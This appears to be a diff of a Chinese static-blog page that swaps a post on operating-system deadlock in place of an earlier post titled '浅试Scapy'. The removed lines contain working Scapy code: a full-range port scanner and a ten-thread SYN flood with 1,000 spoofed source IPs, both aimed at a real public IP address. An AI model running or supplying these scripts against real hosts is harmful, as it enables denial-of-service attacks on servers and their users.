@@ -16,23 +16,23 @@
   <meta name="author" content="Anderson Lee">
   <meta name="keywords" content="">
   
-    <meta name="description" content="在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。 对于SYN洪水不了解的可以看我以前的文章 我们知道一般的网站都是部署在Linux服务器上的，所以在攻击目标网址之前先要知道目标的IP以及暴露端口   利用windows或者Linux自带的ping命令就可以获取对方IP，但是怎么">
+    <meta name="description" content="死锁与饥饿  死锁：各个进程相互等待对方手里的资源，导致各个进程都阻塞，无法向前继续推进的现象。 饥饿：若长期得不到想要的资源，某进程无法向前推进的现象。 死锁的进程是处于阻塞态的，多个进程都无法运行了，而饥饿是还在运行，只是有一个进程一直得不到处理 死锁的四个条件 不剥夺条件  进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放  请求和保持条件  进程以及至少占用了一个资源，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅试Scapy">
-<meta property="og:url" content="http://example.com/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/index.html">
+<meta property="og:title" content="死锁">
+<meta property="og:url" content="http://example.com/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/index.html">
 <meta property="og:site_name" content="Anderson&#39;s blog">
-<meta property="og:description" content="在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。 对于SYN洪水不了解的可以看我以前的文章 我们知道一般的网站都是部署在Linux服务器上的，所以在攻击目标网址之前先要知道目标的IP以及暴露端口   利用windows或者Linux自带的ping命令就可以获取对方IP，但是怎么">
+<meta property="og:description" content="死锁与饥饿  死锁：各个进程相互等待对方手里的资源，导致各个进程都阻塞，无法向前继续推进的现象。 饥饿：若长期得不到想要的资源，某进程无法向前推进的现象。 死锁的进程是处于阻塞态的，多个进程都无法运行了，而饥饿是还在运行，只是有一个进程一直得不到处理 死锁的四个条件 不剥夺条件  进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放  请求和保持条件  进程以及至少占用了一个资源，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/essay/network.png">
-<meta property="article:published_time" content="2022-03-24T13:44:34.000Z">
-<meta property="article:modified_time" content="2022-03-24T14:09:51.776Z">
+<meta property="og:image" content="http://example.com/img/essay/thread.png">
+<meta property="article:published_time" content="2022-03-24T14:47:55.000Z">
+<meta property="article:modified_time" content="2022-03-24T15:44:21.907Z">
 <meta property="article:author" content="Anderson Lee">
-<meta property="article:tag" content="计算机网络">
+<meta property="article:tag" content="操作系统">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/essay/network.png">
+<meta name="twitter:image" content="http://example.com/img/essay/thread.png">
   
   
-  <title>浅试Scapy - Anderson&#39;s blog</title>
+  <title>死锁 - Anderson&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -179,7 +179,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="浅试Scapy">
+            <span class="h2" id="subtitle" title="死锁">
               
             </span>
 
@@ -189,7 +189,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-24 21:44" pubdate>
+      <time datetime="2022-03-24 22:47" pubdate>
         2022年3月24日 晚上
       </time>
     </span>
@@ -200,7 +200,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 字
+      696 字
     </span>
   
 
@@ -209,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16 分钟
+      6 分钟
     </span>
   
 
@@ -238,31 +238,45 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">浅试Scapy</h1>
+            <h1 style="display: none">死锁</h1>
             
             <div class="markdown-body">
-              <p>在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。</p>
-<p>对于SYN洪水不了解的可以看我以前的<a target="_blank" rel="noopener" href="https://andersonlee09.github.io/2022/02/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E9%89%B4%E8%B5%8F/#SYN%E6%B4%AA%E6%B0%B4">文章</a></p>
-<p>我们知道一般的网站都是部署在Linux服务器上的，所以在攻击目标网址之前先要知道目标的IP以及暴露端口</p>
-<img src="/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/image-20220324215916212.png" srcset="/img/loading.gif" lazyload class>
+              <h3 id="死锁与饥饿"><a href="#死锁与饥饿" class="headerlink" title="死锁与饥饿"></a>死锁与饥饿</h3><img src="/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/image-20220324234351318.png" srcset="/img/loading.gif" lazyload class>
 
-<p>利用windows或者Linux自带的ping命令就可以获取对方IP，但是怎么知道目标暴露端口？</p>
-<ul>
-<li>通过抓包软件</li>
+<p>死锁：各个进程相互等待对方手里的资源，导致各个进程都阻塞，无法向前继续推进的现象。</p>
+<p>饥饿：若长期得不到想要的资源，某进程无法向前推进的现象。</p>
+<p>死锁的进程是处于阻塞态的，多个进程都无法运行了，而饥饿是还在运行，只是有一个进程一直得不到处理</p>
+<h3 id="死锁的四个条件"><a href="#死锁的四个条件" class="headerlink" title="死锁的四个条件"></a>死锁的四个条件</h3><ul>
+<li>不剥夺条件</li>
 </ul>
-<p>通过wireshark抓包软件抓取数据包，然后通过数据包来分析对方IP暴露情况，这里不进行讲解，关于wireshark的使用可以看我以前的文章</p>
+<p>进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放</p>
 <ul>
-<li>通过scapy</li>
+<li>请求和保持条件</li>
 </ul>
-<p>scapy是一个非常强大的python第三方库，它提供了构造、解析以及发送和接收数据包的功能，而我们可以对于目标IP的不同端口发送TCP包，如果能在一定时间收到IP就说明该端口暴露，否则不暴露</p>
-<figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, TCP<br><br><span class="hljs-comment"># 清除提示</span><br>conf.verb = <span class="hljs-number">0</span><br><span class="hljs-comment"># the port of ip u want to search</span><br>ip = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># lis = [2250, 3246, 5001, 6432]</span><br><span class="hljs-keyword">for</span> dst_port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>):<br>    pkt = IP(dst=ip) / TCP(dport=dst_port)<br>    ans = sr(pkt, timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># print(ans)</span><br>    <span class="hljs-comment"># print(type(ans))</span><br>    <span class="hljs-comment"># print(ans[0])</span><br>    <span class="hljs-comment"># print(type(ans[0]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(ans[<span class="hljs-number">0</span>]):<br>        <span class="hljs-built_in">print</span>(dst_port)<br></code></pre></td></tr></table></figure>
-
-<p>可以看到代码其实非常简单，遍历不同的对方端口，然后是否能收到的数据包是否正常就可以了</p>
-<p>接下来我们讲解攻击的过程</p>
-<p>首先我在这里模拟了1000个IP用于伪造自己的IP，然后利用自己电脑的不同端口向目标IP端口发起攻击，开启了10个线程同时进行</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, ICMP, TCP<br><span class="hljs-keyword">from</span> scapy.sendrecv <span class="hljs-keyword">import</span> send, sr1, sr, srp1<br><span class="hljs-keyword">from</span> scapy.utils <span class="hljs-keyword">import</span> rdpcap<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-comment"># 攻击的IP</span><br>dst = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># 目标端口</span><br>dst_port = <span class="hljs-number">6342</span><br><span class="hljs-comment"># 随机生成1000个IP</span><br>num = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>))<br>my_ip = [<span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(<br>    random.choice(num)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]<br><span class="hljs-built_in">print</span>(my_ip)<br><span class="hljs-comment"># pkt = IP(src=dst) / TCP()  # 要发生的包</span><br><span class="hljs-comment"># print(pkt.show())</span><br><span class="hljs-comment"># res = sr1(pkt)  # send receive 1  这里收到 1个包</span><br><span class="hljs-comment"># res = sr()  # send and receive  这里收到 所有 包</span><br><span class="hljs-comment"># res = send()  # 只发不收</span><br><span class="hljs-comment"># res = srp1()  # 只发送两层  不发送传输层</span><br><span class="hljs-comment"># print(res.summary())</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>():<br>    <span class="hljs-keyword">for</span> src_ort <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>, <span class="hljs-number">65535</span>):<br>        ipLayer = IP(src=random.choice(my_ip), dst=dst)<br>        tcpLayer = TCP(sport=src_ort, dport=dst_port, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>        pkt = ipLayer / tcpLayer<br>        send(pkt)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        threading.Thread(target=synFlood).start()<br></code></pre></td></tr></table></figure>
-
-<p>因为个人PC能造成的杀伤实在有限，可能难以造成肉眼可见的效果，但是当PC多了以后就能形成Ddos攻击，这里只是分享一种实现方法~</p>
+<p>进程以及至少占用了一个资源，但是又提出了新的资源请求，而该资源又被其他的进程占有，又对于自身的资源保持不放</p>
+<ul>
+<li>循环等待</li>
+</ul>
+<p>若干个进程资源存在循环等待链，链条中每个进程都被下一个进程请求</p>
+<p>现在假设一个场景，两个小孩都想尝一下两个苹果，但是它们一次只能拿着一个苹果吃一口，现在A吃完了自己手上的苹果，然后B吃完了自己手上的苹果，现在A想去拿B的苹果，B又想去拿A的苹果，但是两个小孩都很不懂事，它们都不行自己先去放下自己手中的苹果，那双方就会一直这样僵持下去。这就是死锁</p>
+<h2 id="死锁的处理"><a href="#死锁的处理" class="headerlink" title="死锁的处理"></a>死锁的处理</h2><h3 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h3><p>对于死锁形成的四个必要条件，那就会有四种不同的破坏策略</p>
+<ul>
+<li>互斥条件</li>
+</ul>
+<p>只有互斥的资源的争抢才会形成死锁，因为资源只能被一个进程享受。可以看看释放能将资源改为共享的，比如把苹果放在桌子上，两个小孩都可以去同时咬。</p>
+<ul>
+<li>不剥夺条件</li>
+</ul>
+<p>当进程得不到想要的资源的时候可以去考虑释放自己的资源，然后尝试去再次获取</p>
+<p>但是这样容易前功尽弃，以前好不容易申请的资源又释放了</p>
+<ul>
+<li>请求和保持</li>
+</ul>
+<p>进程在运行前先去得到他所需要的全部资源这样就不会去争抢资源了，但是这是很难去实现的</p>
+<ul>
+<li>循环等待</li>
+</ul>
+<p>可采用顺序资源分配法，首先给系统资源编号，每个进程去按顺序请求资源，这样就不会循环等待了，但是这个时候如果又新增的进程，这就会很不方便</p>
 
             </div>
             <hr>
@@ -272,7 +286,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a>
+                      <a class="hover-with-bg" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
                     
                   </div>
                 
@@ -280,7 +294,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a>
+                      <a class="hover-with-bg" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
                     
                   </div>
                 
@@ -297,18 +311,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">死锁</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/">
-                        <span class="hidden-mobile">CodingInterview25合并两个排序链表</span>
+                      <a href="/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/">
+                        <span class="hidden-mobile">浅试Scapy</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
